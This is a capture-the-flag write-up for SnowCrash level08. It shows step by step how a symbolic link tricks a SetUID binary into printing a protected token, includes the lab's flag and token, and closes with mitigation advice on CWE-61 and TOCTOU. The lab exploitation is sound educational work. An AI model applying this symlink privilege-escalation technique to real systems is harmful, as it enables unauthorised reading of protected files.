## 📄 Description

In this level, we are presented with a SetUID binary owned by the next level's user (flag08). Our objective is to exploit the binary in order to gain access to a protected token file owned by flag08. By leveraging a symbolic link vulnerability, we can trick the binary into reading the file on our behalf and retrieve the flag.

## 🧩 Challenge Overview

- We are given a SetUID binary owned by flag08:

```
-rwsr-s---+ 1 flag08 level08 8.5K level08
```

- The goal is to read a protected token file:

```
-rw------- 1 flag08 flag08 26 token
```

- Running ./level08 token returns:

```
You may not access 'token'
```

## ⚔️ Exploitation Strategy

The binary checks if the user can access the file passed as an argument but does not properly resolve symbolic links. Since we can't read the token file directly, we exploit this by:

1. Creating a symbolic link to the restricted file:

```
ln -s /home/user/level08/token /tmp/temp_tok
```

2. Passing the symlink to the binary:

```
./level08 /tmp/temp_tok
```

3. The binary follows the symlink and prints the contents of the token file:

```
quif5eloekouj29ke0vouxean
```

and now lets get out flag.

```
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## 🛡️ Mitigation Advice (Real Systems)

In a real-world context, this vulnerability would be classified as:

- **Symlink Following Vulnerability** (CWE-61)
- **TOCTOU** (Time-of-Check to Time-of-Use) (CWE-367)

#### 🧼 Best Practices:

- Avoid symlinks with **O_NOFOLLOW** (prevent opening symlinks) or use **lstat()** (detect and block them before opening) for validation.
- Use **openat()** (Open a file relative to a directory file descriptor) and work with file descriptors to prevent TOCTOU.
